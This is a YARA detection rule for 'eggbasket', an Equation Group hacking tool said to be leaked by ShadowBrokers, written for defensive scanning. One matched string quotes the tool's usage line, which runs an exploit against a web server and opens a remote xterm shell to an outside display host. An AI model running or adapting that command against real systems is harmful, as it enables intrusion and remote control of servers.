rule EquationGroup_eggbasket {
  meta:
    author = "Spider"
    comment = "None"
    date = "2017-04-08"
    description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
    family = "None"
    hacker = "None"
    hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
    judge = "unknown"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
    threatname = "None"
    threattype = "None"
  strings:
    $x1 = "# Building Shellcode into exploit." fullword ascii
    $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
    $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
  condition:
    ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}